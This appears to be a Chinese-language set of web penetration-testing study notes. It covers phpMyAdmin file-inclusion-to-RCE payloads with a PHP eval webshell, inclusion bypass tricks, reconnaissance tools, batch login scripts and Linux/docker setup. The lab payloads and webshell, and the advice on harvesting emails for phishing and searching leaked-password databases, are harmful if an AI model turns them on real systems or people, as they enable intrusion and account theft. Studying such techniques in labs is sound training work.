<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpmyadmin/index.php?s=phpinfo();&amp;target=export.php%25%33%66/../../../../../../../../../../xampp/mysql/data/test/6666.frm#这里的s就是我们之前插入的一句话木马的密码</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210211151335525.png" alt="image-20210211151335525"></p>
<p>3、利用PHP session序列化数据从而进行RCE</p>
<p>原理：我们在数据库里查询的命令都会记录在：sess_pmavalue    文件里，注意，pmavalue  这个名字并不是固定的，只有sess_  是固定的，该文件一般都是    sess_    +   我们查询的语句再f12页面获取的value   拼接起来的</p>
<p>sess_pmavalue 文件的路径：</p>
<p>​    linux下：     /var/lib/php/session/</p>
<p>​    windows：</p>
<p>​        phpstudy下：   /phpstudy/PHPTutorial/tmp/tmp</p>
<p>​        xmapp下：    xampp/tmp/sess_pmavalue</p>
<p>前提：按下f12，接着需要在phpadmin里执行以下语句，此时一旦执行完毕，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &#x27;&lt;?php @eval($_GET[s]);exit();?&gt;&#x27; ；</span><br></pre></td></tr></table></figure>

<p>接着选中我们刚刚查询的那条记录（利用f12的那个小箭头），复制value</p>
<p><img src="/source/hetian/image-20210211151836635.png" alt="image-20210211151836635"></p>
<p>将value和  sess_   进行拼接   </p>
<p>执行payload</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpmyadmin/index.php?s=phpinfo();&amp;target=export.php%25%33%66/../../../tmp/sess_klue009hk58sp2v6rvuqb28f9m#后面的文件名是拼接起来的</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210211152201706.png" alt="image-20210211152201706"></p>
<p>实验地址：<a target="_blank" rel="noopener" href="http://www.hetianlab.com/expc.do?ec=ECID169b-e5a2-4f81-8881-a6b216573892">http://www.hetianlab.com/expc.do?ec=ECID169b-e5a2-4f81-8881-a6b216573892</a></p>
<p>参考链接（很详细）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41901122/article/details/104718333">https://blog.csdn.net/qq_41901122/article/details/104718333</a>   </p>
<p>或者参考自己的doc文档：phpMyAdmin文件包含漏洞</p>
<h3 id="2-2-绕过方式"><a href="#2-2-绕过方式" class="headerlink" title="2.2 绕过方式"></a>2.2 绕过方式</h3><p>1、源码给我们传入的包含文件名称后面自动加上  html后缀</p>
<p>绕过的前提：</p>
<p>​    1、必须要php版本低于5.3.4</p>
<p>​    2、必须要魔术引号处于关闭状态：magic_quotes_gpc =false</p>
<p>绕过方法：使用空字节来绕过，即在我们包含的文件名后面加上  %00</p>
<p><img src="/source/hetian/image-20210209182511725.png" alt="image-20210209182511725"></p>
<p>2、当我们包含的文件出错或者无法上传文件并且无法包含远程文件时，此时如果我们知道include的文件名，那么可以通过读取include文件的源码，来找其他漏洞或者绕过方式，相当于就是看着别人的规则来绕过</p>
<p>易错点：</p>
<p>​    1、是resource而不是recource，是s而不是c</p>
<p>​    2、在复制base64的源码的时候，一定要复制全，我们直接在源码界面复制不方便，完全可以全选—复制到桌面的文档里，然后在文档里复制就ok了</p>
<p>172.17.0.2/2.php?filename=php://filter/read=convert.base64-encode/resource=2.php</p>
<p>这里filter是一个封装器，就是在我们读取或者写入数据流之前，先对该数据流进行处理，该过滤器有一个resoruce参数，即指定需要读取的文件，这里是2.php  ,read表示在读取之前进行相关操作（如果是要写入的话，也可以是write），等于后面接的是一个过滤器，covert.base64-encode就是在读取之前，将其base64编码</p>
<p><img src="/source/hetian/image-20210209192102027.png" alt="image-20210209192102027"></p>
<p>接着base64解码，在火狐的hackbar里解码，选中，然后点击解码</p>
<p><img src="/source/hetian/image-20210211170646713.png" alt="image-20210211170646713"></p>
<p>那么为什么要选择covert.base64-encode过滤器呢？毕竟有好多过滤器呢？</p>
<p>因为我们目的是完整的读取源代码，所以我们读取的源代码必须要是完整的，而这么多过滤器里，只有covert.base64-encode过滤器符合要求</p>
<p>为什么不能用 file:// 来读取源代码？</p>
<p>那我file包含php文件会解析里面的php代码，导致死循环，自己包含自己</p>
<p>具体原因解释可以参考预习内容：文件包含-中级篇-实验3</p>
<p>3、当我们使用相对路径的 .. /被过滤了怎么办？</p>
<p>可以重写，即 ….//    来绕过，有时候系统过滤2个点，那么我们写4个点，即可绕过</p>
<p>4、利用各种伪协议来绕过</p>
<p><img src="/source/hetian/image-20210211214528996.png" alt="image-20210211214528996"></p>
<h2 id="3、远程文件包含"><a href="#3、远程文件包含" class="headerlink" title="3、远程文件包含"></a>3、远程文件包含</h2><h3 id="3-1-利用方式"><a href="#3-1-利用方式" class="headerlink" title="3.1  利用方式"></a>3.1  利用方式</h3><p>什么是远程文件包含？</p>
<p>被包含的文件在远程服务端</p>
<p>利用方式：</p>
<p>包含攻击者指定的远程url文件</p>
<p>远程文件包含需满足的条件：</p>
<ol>
<li>include等包含函数的文件名前面不能任何拼接其他字符。</li>
<li>allow_url_fopen 需要开启，也就是allow_url_fopen=on，默认开启。</li>
<li>allow_url_include 需要开启，也就是allow_url_include=on，（php5.2之后）默认不开启所以在实际利用中，想要遇到远程文件包含的漏洞比较难。</li>
</ol>
<p>易错点：</p>
<p>1、传递参数时，第一个参数必须用问号 ？ 连接，后面如果还需要传递参数，就需要用  &amp;  连接了  ，</p>
<p>比如：127.0.0.1/4.phpfile=ceshi2.txt&amp;a=phpinfo();        这里file就是第一个参数，所以用问号连接，a是第二个参数，所以用  &amp;   连接</p>
<p><img src="/source/hetian/image-20210208194514800.png" alt="image-20210208194514800"></p>
<p>2、当我们通过在浏览器上连接一句话木马后，在浏览器里执行相关命令，命令后面必须要有分号  ；   </p>
<p><img src="/source/hetian/image-20210208194629958.png" alt="image-20210208194629958"></p>
<h3 id="3-2-绕过方式"><a href="#3-2-绕过方式" class="headerlink" title="3.2  绕过方式"></a>3.2  绕过方式</h3><p>1、源码给我们传入的远程包含的文件名称后面自动加上  html后缀</p>
<p>绕过的前提：没有前提，只要能远程包含即可</p>
<p>绕过方法有4种</p>
<p>方法一：在远程包含的文件名后面加上问号  ？ </p>
<p>原理：问号后面一半接参数名和参数的值，该网站是自动加 .html   </p>
<p>所以远程的url就是/1.txt?.html       这里.html 是参数名，由于其后面没有添加值，所以值为空，所以相当于远程包含的文件仍然是 1.txt，只是同时给1.txt传递了一个 .html参数，值为0罢了，总结就是包含的还是1.txt，所以就可以绕过</p>
<p><img src="/source/hetian/image-20210209184357800.png" alt="image-20210209184357800"></p>
<p>方法二：在远程包含的文件名后面加上  # </p>
<p>原理：#号是锚点符号，#后面的内容被认为是锚点内容，所以，include认为应该请求的URL为<a target="_blank" rel="noopener" href="http://172.17.0.3/1.txt%EF%BC%8C%E4%BA%8E%E6%98%AF%E5%8F%91%E8%B5%B7http%E8%AF%B7%E6%B1%82%E8%AF%BB%E5%8F%96%E8%AF%A5%E6%96%87%E4%BB%B6%E5%B9%B6%E5%8C%85%E5%90%AB">http://172.17.0.3/1.txt，于是发起http请求读取该文件并包含</a></p>
<p>易错点：不能直接添加#号，而是要将其编码后添加，即添加 23%</p>
<p><img src="/source/hetian/image-20210209184645690.png" alt="image-20210209184645690"></p>
<p><img src="/source/hetian/image-20210209184437205.png" alt="image-20210209184437205"></p>
<p>方法三：在远程包含的文件名后面加上  空格 </p>
<p>原理：</p>
<p>易错点：不能直接添加空格，而是要将其编码后添加，即添加 20%</p>
<p><img src="/source/hetian/image-20210209184607524.png" alt="image-20210209184607524"></p>
<p><img src="/source/hetian/image-20210209184625467.png" alt="image-20210209184625467"></p>
<p>方法四：构造的远程包含的文件不带后缀名即可绕过</p>
<p>原理：远程服务器可以根据存在远程文件包含漏洞的服务器的添加后缀的规则来创建远程文件，打个比方，如果存在漏洞的网站的规则是添加 .html 后缀，那么我就包含一个 .html 的文件（该文件内容里有一句话木马），但是我在构造远程包含的url的时候，就主动去掉该url里的文件名的html后缀，因为存在漏洞的网站会自动给我添加的，所以这样就实现了绕过</p>
<p><img src="/source/hetian/image-20210209184752572.png" alt="image-20210209184752572"></p>
<h2 id="4、文件包含的防御"><a href="#4、文件包含的防御" class="headerlink" title="4、文件包含的防御"></a>4、文件包含的防御</h2><p>1、尽量不使用动态包含，无需情况下设置 allow_url_include和 allow_url_fopen为关闭；<br>2、对可以包含的文件进行限制：使用白名单的方式，或者设置包含的目录，open_basedir；<br>3、严格检查用户输入，参数中不允许出现 ../ 之类的目录跳转符；<br>4、 不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
<h1 id="第七章-信息搜集"><a href="#第七章-信息搜集" class="headerlink" title="第七章 信息搜集"></a>第七章 信息搜集</h1><p>一、域名资产扩大</p>
<h2 id="1、根据src提供的资产进行扩大"><a href="#1、根据src提供的资产进行扩大" class="headerlink" title="1、根据src提供的资产进行扩大"></a>1、根据src提供的资产进行扩大</h2><p>目的：查询其他的域名</p>
<p>ICP/IP地址、域名信息备案管理系统： <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">https://beian.miit.gov.cn/#/Integrated/index</a></p>
<p>天眼查：<a target="_blank" rel="noopener" href="https://www.tianyancha.com/?jsid=SEM-BAIDU-PZ-SY-2021112-JRGW">https://www.tianyancha.com/?jsid=SEM-BAIDU-PZ-SY-2021112-JRGW</a></p>
<p>全国互联网安全管理服务平台：<a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/index.do">http://www.beian.gov.cn/portal/index.do</a></p>
<p>站长之家：<a target="_blank" rel="noopener" href="http://icp.chinaz.com/">http://icp.chinaz.com/</a></p>
<p>意见建议：使用站长之家，手机备案的其他域名，复制到txt中，然后去网址进行url提取：<a target="_blank" rel="noopener" href="http://www.txttool.com/WenBen_RegExpURL.asp">http://www.txttool.com/WenBen_RegExpURL.asp</a></p>
<p>技巧：如果src官方给定了多个域名，我们需要将这多个域名都去站长之家查，会有意想不到的jingxi惊喜，会冒出来第二个公司的实际掌权人，这样又扩大了域名范围。</p>
<p>并且，最后提取的备案域名都要记得去重</p>
<h2 id="2、挖掘子域名进行扩大"><a href="#2、挖掘子域名进行扩大" class="headerlink" title="2、挖掘子域名进行扩大"></a>2、挖掘子域名进行扩大</h2><p>目的：利用OneForAll跑出子域名—–利用teemo获取c段+观察来判断是否存在c段（比如大量的c段ip，就存在c段）–Ksacn获取c段的web服务</p>
<p>OneForAll</p>
<p>核心：需要配置好各种api</p>
<p>收费api获取： fofa_api      在code里找</p>
<p>1、查询</p>
<p>命令：前提是其配置文件里没开启burp，默认是开启的，我们需要将其改为False否则无法正常使用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target url run </span><br><span class="line">python3 oneforall.py --targets ./domains.txt run </span><br></pre></td></tr></table></figure>



<p>2、爆破（需要单独运行burp.py，在其根目录下）</p>
<p>核心：依赖于字典</p>
<p>字典地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 brute.py --targets ./domains.txt --word <span class="literal">True</span> --wordlist subnames.txt run</span><br></pre></td></tr></table></figure>



<p>teemo：<a target="_blank" rel="noopener" href="https://github.com/bit4woo/teemo">https://github.com/bit4woo/teemo</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python teemo.py -d example.com</span><br></pre></td></tr></table></figure>



<p>Kscan</p>
<p><a target="_blank" rel="noopener" href="https://github.com/lcvvvv/kscan/releases/tag/v1.12">https://github.com/lcvvvv/kscan/releases/tag/v1.12</a></p>
<p>常用命令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">example：	kscan -t www.baidu.com</span><br><span class="line"><span class="comment">#你可以直接输入域名</span></span><br><span class="line">example：	kscan -t http://www.baidu.com/<span class="number">1.</span>asp</span><br><span class="line"><span class="comment">#你也可以直接输入URL地址</span></span><br><span class="line">example：	kscan -t <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span></span><br><span class="line"><span class="comment">#你还可以直接输入IP地址</span></span><br><span class="line">example：	kscan -t <span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span>/<span class="number">24</span></span><br><span class="line"><span class="comment">#你当然也可以直接输入IP+掩码</span></span><br><span class="line">example：	kscan -t file:/tmp/target.txt</span><br><span class="line"><span class="comment">#你亦可以从文件导入,你甚至文件里面还可以嵌套文件</span></span><br><span class="line"><span class="comment">#其他命令都是一些修饰命令，相信聪明的你们都会用啦~~~</span></span><br></pre></td></tr></table></figure>



<p>用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">usage: kscan [-h,--<span class="built_in">help</span>] (-t,--target) [-p,--port|--top] [-o,--output] [--proxy] [--threads] [--http-code] [--path] [--host] [--timeout]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h , --<span class="built_in">help</span>     show this <span class="built_in">help</span> message <span class="keyword">and</span> exit</span><br><span class="line">  -t , --target   直接扫描指定对象,支持IP、URL、IP/[<span class="number">16</span>-<span class="number">32</span>]、file:/tmp/target.txt</span><br><span class="line">  -p , --port     扫描指定端口，默认会扫描TOP400，支持：<span class="number">80</span>,<span class="number">8080</span>,<span class="number">8088</span>-<span class="number">8090</span></span><br><span class="line">  -o , --output   将扫描结果保存到文件</span><br><span class="line">  --top           扫描WooYun统计开放端口前x个，最高支持<span class="number">1000</span>个</span><br><span class="line">  --proxy         设置代理&#123;socks5/socks4/https/http&#125;://IP:port</span><br><span class="line">  --threads       线程参数,默认线程<span class="number">4000</span></span><br><span class="line">  --http-code     指定会记录的HTTP状态码，逗号分割,默认会记录<span class="number">200</span>,<span class="number">301</span>,<span class="number">302</span>,<span class="number">403</span>,<span class="number">404</span></span><br><span class="line">  --path          指定请求访问的目录，逗号分割，慎用！</span><br><span class="line">  --host          指定所有请求的头部HOSTS值，慎用！</span><br><span class="line">  --timeout       设置超时时间，默认<span class="number">3</span>秒钟，单位为秒！</span><br></pre></td></tr></table></figure>



<p>layer</p>
<h2 id="3、信息的利用与扫描"><a href="#3、信息的利用与扫描" class="headerlink" title="3、信息的利用与扫描"></a>3、信息的利用与扫描</h2><p>​    1、将OneForAll跑出来的域名去重，存活检测，接着弄到扫描器进行扫描</p>
<p>​     2、根据kscan扫描的分类，根据其中间件、服务、框架，找专门的批量脚本进行定点扫描</p>
<p>​    3、进行源码备份扫描</p>
<p><a href="mailto:&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#102;&#x7a;&#x75;&#46;&#101;&#100;&#117;&#x2e;&#99;&#110;">&#x61;&#x64;&#x6d;&#105;&#x6e;&#64;&#102;&#x7a;&#x75;&#46;&#101;&#100;&#117;&#x2e;&#99;&#110;</a></p>
<h2 id="4、其他信息收集"><a href="#4、其他信息收集" class="headerlink" title="4、其他信息收集"></a>4、其他信息收集</h2><p>在前面1,2，3步骤没找到漏洞的话，就进行这第4步</p>
<p>目的：</p>
<p>​    主要是用来邮件钓鱼（挖src不让钓鱼）</p>
<p>​    后台登录、社工库查找旧的密码</p>
<p>收集的内容：</p>
<p>whois、备案信息、邮箱、手机号、姓名</p>
<p>github上搜索—-然后选择左边的code</p>
<p>社工库里搜索</p>
<p>邮箱获取技巧：通过whois获取的邮箱是不精确的，它部分被打了星号，那么怎么找到具体的邮箱呢？</p>
<p>使用google语法，也可以百度搜：intext:@hetian.com</p>
<h2 id="5、手工渗透"><a href="#5、手工渗透" class="headerlink" title="5、手工渗透"></a>5、手工渗透</h2><p>前提：上述1-4都找不到洞的情况下</p>
<p>1、找到之前oneforall挖掘的子域名，然后通过工具去存活，比如kscan，接着就对这些存活的网站一个一个手工测试</p>
<p>2、目录扫描</p>
<p>需求的内容：</p>
<p>​        敏感目录：比如登录页面</p>
<p>​        源码泄露</p>
<p>​        数据库泄露</p>
<p>​        敏感文件：.mdb   .excel  .word   .zip    .rar   </p>
<p>​        文件泄露：WEB-INF/web.xml泄露</p>
<p>​        js文件扫描：当我们获取到js文件后，需要通过BurpJSLinkFinder、LinkFinder   来提取js文件里的接口（也就是目录扫描不到的一些url）</p>
<p>易错点：要防止速度过快，请求头、等等，防止被防火墙过滤，禁止ip，</p>
<p>技巧：记得修改字典</p>
<p>核心：基于字典：<a target="_blank" rel="noopener" href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<p>工具：dirsearch     <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
<p>3、web之外的信息搜集（近几年才流行，漏洞多）</p>
<p>公众号、小程序、app、服务号</p>
<h3 id="6、poc批量篇"><a href="#6、poc批量篇" class="headerlink" title="6、poc批量篇"></a>6、poc批量篇</h3><p>fofa采集，批量搜索采集：<a target="_blank" rel="noopener" href="https://github.com/WilliamL71Oi/FOFA_PRO_GUI">https://github.com/WilliamL71Oi/FOFA_PRO_GUI</a></p>
<p>登录代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&#x27;https://www.hetianlab.com/Login.action&#x27;</span></span><br><span class="line">params =&#123;</span><br><span class="line"> <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1589478101@qq.com&quot;</span>,</span><br><span class="line"> <span class="string">&quot;password&quot;</span>:<span class="string">&quot;XXX&quot;</span>,</span><br><span class="line"> <span class="string">&quot;validateCode&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;actInviter&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rtnJson&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;333&quot;</span>,</span><br><span class="line"><span class="string">&quot;content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"> response = requests.post(url, data = params, headers = headers,timeout=<span class="number">3</span>)</span><br><span class="line"> <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">except</span> :</span><br><span class="line"> <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>批量代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">&#x27;urls.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">ips = fr.readlines()</span><br><span class="line">fr.close()</span><br><span class="line"><span class="keyword">for</span> urls <span class="keyword">in</span> ips:</span><br><span class="line"> url =<span class="string">&#x27;http://&#x27;</span>+urls</span><br><span class="line"> params =&#123;</span><br><span class="line"> <span class="string">&quot;username&quot;</span>:<span class="string">&quot;1589478101@qq.com&quot;</span>,</span><br><span class="line"> <span class="string">&quot;password&quot;</span>:<span class="string">&quot;xxxxxxx&quot;</span>,</span><br><span class="line"> <span class="string">&quot;validateCode&quot;</span>:<span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="string">&quot;actInviter&quot;</span>:<span class="string">&quot;true&quot;</span>,</span><br><span class="line">    <span class="string">&quot;rtnJson&quot;</span>:<span class="string">&quot;true&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"> headers=&#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;333&quot;</span>,</span><br><span class="line"><span class="string">&quot;content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">         &#125;</span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line">  response = requests.post(url, data = params, headers = headers,timeout=<span class="number">3</span>)</span><br><span class="line">  <span class="built_in">print</span>(response.status_code)</span><br><span class="line"> <span class="keyword">except</span> :</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br><span class="line"> <span class="comment">#print (response.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应内容，response.content返回的字节流数据</span></span><br><span class="line"><span class="comment">#print (response.content)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="comment">#print (response.url)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="comment">#print (response.encoding)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看响应码</span></span><br></pre></td></tr></table></figure>






















<h1 id="第八章：附录"><a href="#第八章：附录" class="headerlink" title="第八章：附录"></a>第八章：附录</h1><h2 id="1、word使用技巧"><a href="#1、word使用技巧" class="headerlink" title="1、word使用技巧"></a>1、word使用技巧</h2><h2 id="2、linux常用命令"><a href="#2、linux常用命令" class="headerlink" title="2、linux常用命令"></a>2、linux常用命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1、清屏：clear2、安装指定包（软件）：apt install 软件名3、打开更新源的文件：vim /etc/apt/sources.list4、更新一下源：apt-get update5、更新一下软件：ape-get upgrade6、更新一下系统：apt-get dist-upgrade7、安装apache2：apt install apache2 8、查看apache2的状态：service apache2 status9、启动apache2：service apache2 start 10、安装mysql：apt insttall mariadb mariadb-server   安装11、查看mysql的状态：service mariadb status   查看状态12、启动mariadb：service mariadb start    13、安装php：apt -y install php7.0 php-pear libapache2-mod-php7.0 php7.0-mysql php7.0-curl php7.0-json php7.0-cgi php7.0-gd14、将apache2添加到自启动：systemctl enable apache215、将mariadb添加到自启动：systemctl enable mariadb16、查看ip：ifconfig17、将压缩包解压：unzip DVWA-master.zip 18、移动并重命名文件：mv DVWA-master /var/www/html/dvwa19、切换工作目录：cd /var/www/html/dvwa 20、查看目录下的所有东西：ls21、给目录或文件添加所有权限：chmod 777 uploads22、给tmp目录及目录下的所有文件添加权限：chmod 777 -R tmp/23、数据库操作（前提进入数据库，输入mysql）创建用户dvwa@localhost，密码dvwacreate user ‘dvwa@localhost’ identified by &#x27;dvwa&#x27;;赋予权限：grant all privileges on *.* to ‘dvwa@localhost’;刷新权限：flush privileges;24、查找php.ini文件：find / -name php.ini25、给文件写入内容：文件不存在则会被创建	一个 &gt; 则是覆盖内容，如果文件有内容，则原有内容会被清空；而 &gt;&gt; 则是在原有内容后面追加	覆盖内容：echo &#x27;test&#x27; &gt; 1.txt	在内容后面追加：echo &#x27;ceshi&#x27; &gt;&gt; 1.txt26、kali安装pip3（默认没安装）：	sudo wget https://bootstrap.pypa.io/get-pip.py  //下载安装脚本。	sudo python3 get-pip.py  //执行安装脚本	sudo pip3 -V  //查看当前pip3的版本</span><br></pre></td></tr></table></figure>

<h2 id="3、常用软件启动命令"><a href="#3、常用软件启动命令" class="headerlink" title="3、常用软件启动命令"></a>3、常用软件启动命令</h2><h3 id="1、Lamp"><a href="#1、Lamp" class="headerlink" title="1、Lamp"></a>1、Lamp</h3><h3 id="2、docker"><a href="#2、docker" class="headerlink" title="2、docker"></a>2、docker</h3><p>① 首先要确保是root权限，可以直接以root账户登录或者在每次使用命令前使用sudo，我这里是直接用root登录的，所以不用sudo</p>
<p>②查看本地是否有我们的镜像文件，比如php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210209121705416.png" alt="image-20210209121705416"></p>
<p>如果没有，则下载，执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull php:5.5-apache</span><br></pre></td></tr></table></figure>



<p>③新建容器，这里的phptest就是容器名， 9110:80   就是通过访问计算机的9110来实现访问该容器的80端口，这里的php:5.5-apache  就是刚才查看的images里的镜像，表示依据该镜像来创建一个容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name phptest -d -it -p 9110:80 php:5.5-apache /bin/bash</span><br></pre></td></tr></table></figure>

<p>执行成功后会返回一个id，该id如果后面执行某个命令需要id，就可以将该id提供给它</p>
<p><img src="/source/hetian/image-20210209122148554.png" alt="image-20210209122148554"></p>
<p>④ 启动镜像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start phptest    #这个phptest就是刚刚创建这个镜像时设置的容器名</span><br></pre></td></tr></table></figure>

<p>执行后，会返回容器名</p>
<p><img src="/source/hetian/image-20210209122404231.png" alt="image-20210209122404231"></p>
<p>⑤ 进入容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it phptest /bin/bash</span><br></pre></td></tr></table></figure>

<p>执行成功后，会自动切换到当前容器的环境（web服务）的根目录</p>
<p><img src="/source/hetian/image-20210209122725134.png" alt="image-20210209122725134"></p>
<p>⑥ 启动当前容器的apache服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210209122811930.png" alt="image-20210209122811930"></p>
<p>显示ok就代表启动成功</p>
<p>⑦ 查看当前容器的ip，然后依据该ip来访问该容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>

<p><img src="/source/hetian/image-20210209123002190.png" alt="image-20210209123002190"></p>
<p>浏览器访问该ip</p>
<p><img src="/source/hetian/image-20210209123054891.png" alt="image-20210209123054891"></p>
<p>如果出现这种apache的错误就代表成功了，之所以报错，是因为网站目录下没有首页文件，403错误，文件不存在</p>
